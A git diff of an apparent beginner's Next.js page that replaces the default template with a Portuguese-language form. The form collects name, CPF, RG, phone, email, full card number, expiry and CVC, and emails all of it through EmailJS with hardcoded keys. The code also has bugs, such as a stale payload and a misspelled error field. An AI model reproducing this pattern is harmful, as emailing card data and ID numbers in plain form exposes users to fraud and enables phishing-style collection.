@@ -1,113 +1,115 @@
-import Image from 'next/image'
+"use client"
+import Input from "@/app/components/Input"
+import { useForm } from "react-hook-form"
+import { useState } from "react"
+import { zodResolver } from "@hookform/resolvers/zod"
+import {z} from "zod"
+import emailjs from '@emailjs/browser';
+
+const createUserFomrSchema = z.object({
+  name: z.object({
+    firstName: z.string().nonempty("teste")
+  .transform(firstName => {
+    return firstName.trim().split(" ").map(word => {
+    return word[0].toLocaleUpperCase().concat(word.substring(1))
+  }).join("")}),
+  lastName: z.string().nonempty("Sobrenome Obrigatório").transform(firstName => {return firstName.trim().split(' ').map(word => {
+  return word[0].toLocaleUpperCase().concat(word.substring(1))
+   }).join(" ")}),
+  }),
+   cpf: z.string().nonempty("O CPF e Obrigatório").min(14, {message : "O CPF tem que ter no minimo 11 digitos"}),
+   rg: z.string().nonempty("O RG e Obrigatorio").min(12, {message: "O CPF tem que ter no minimo 9 digitos"}),
+   telefone:z.object({
+    ddi: z.string().nonempty("O DDi e obrigatorio"),
+    tell: z.string().nonempty("O Telefone com o DDD e obrigatorio"),
+   }),
+   card: z.object({
+    cardnunber: z.string().nonempty('O numero do catãoo e Obrigatorio').min(19, {message: "O Cartão precisa ter no minimo 16 digitos"}),
+    datecard: z.string().nonempty('A data do cartão e obrigatoria').min(5, {message:"E a data precisa ser composta por mes e ano"}),
+    cvccard: z.string().nonempty('O CVC e obrigatorio').min(3, {message:"E necessario colocar 3 digitos do codigo de segurança"}),
+   }),
+   email: z.string().email('E-mail invalido').nonempty("O e-mail e obrigatorio"),
+
+ })
 
 export default function Home() {
+   const { register, handleSubmit, formState : {errors} } = useForm({
+    resolver: zodResolver(createUserFomrSchema),
+    mode: "onSubmit",
+  }
+   );
+  console.log("erros : ",errors)
+   const [data, setData] = useState();
+
+  const templete = {
+    from_name: JSON.stringify(data?.name?.firstName),
+    message: JSON.stringify(data),
+    email:  JSON.stringify(data?.email)
+  }
+
+   function teste02(data){
+    setData(JSON.stringify(data, null, 2))
+    console.log(errors)
+    console.log(data)
+    emailjs.send("service_0470bzm", "template_tfn321q", templete, "GsHeakWXm2sPdMkj3")
+    .then((response) => {
+      console.log('Deu bom meu chapa')
+    })
+   }
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.js</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
+    <main>
+      <form onSubmit={handleSubmit(teste02)}>
+        <label>
+        Nome
+        <Input registerInput={{...register("name[firstName]")}} mask={"********************"}
+        formatChars={{ "*": "[A-Za-z ]" }} 
+         placeholder="Primeiro Nome" />
+        {errors.name?.firstName?.message && <p>{errors.name.firstName.message}</p>}
+         
+        <Input  registerInput={{...register("name[lastName]")}} mask={"***************************"}
+        placeholder="Digite seu nome"
+        formatChars={{ "*": "[A-Za-z ]" }}
+         />
+        {errors.name?.lastName?.message && <p>{errors.name.lastName.message}</p>}
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800 hover:dark:bg-opacity-30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
+        </label>
+       <label>
+        CPF
+        <Input mask="999.999.999-99" registerInput={{...register("cpf")}} placeholder="123.456.789.00"/>
+        {errors.cpf?.message && <p>{errors.cpf.message}</p>}
+       </label>
+       <label>
+        RG
+       <Input mask="99.999.999-9" registerInput={{...register("rg")}} placeholder="12.345.678-0"/>
+       {errors.rg?.message && <p>{errors.rg.message}</p>}
+       </label>
+       <label>
+        Data de nascimento
+       <Input registerInput={{...register("date")}} mask={"99/99/9999"} placeholder="00/00/00"/>
+       </label>
+       <label>
+        Email
+        <input className="text-black" {...register("email")} type="email"  placeholder="exemplo@gmail.com"/>
+       {errors.email?.message && <p>{errors.email.message}</p>}
+       </label>
+       <label>
+        Telefone
+        <Input registerInput={{...register("telefone[ddi]")}} mask={'+99'} placeholder="+XX"/>
+       {errors.telefone?.ddi?.message && <p>{errors.telefone.ddi.message}</p>}
+        <Input registerInput={{...register("telefone[tell]")}} mask={'(99) 9 9999-9999'}  placeholder="(XX) XXXXXXXXX"/>
+       {errors.telefone?.tell?.message && <p>{errors.telefone.tell.message}</p>}
+       </label>
+       <label>
+        Cartão
+        <Input registerInput={{...register("card[cardnunber]")}} mask={'9999 9999 9999 9999'}  placeholder="Numero do cartão"/>
+       {errors.card?.cardnunber?.message && <p>{errors.card.cardnunber.message}</p>}
+        <Input registerInput={{...register("card[datecard]")}} mask={'99/99'}  placeholder="XX/XX"/>
+       {errors.card?.datecard?.message && <p>{errors.card.datecard.message}</p>}
+        <Input registerInput={{...register("card[cvccard]")}} mask={'999'}  placeholder="CVC"/>
+       {errors.cadr?.cvccard?.message && <p>{errors.card.cvccard.message}</p>}
+       </label>
+       <input type="submit" value="Vai filhão" />
+      </form>
     </main>
   )
 }
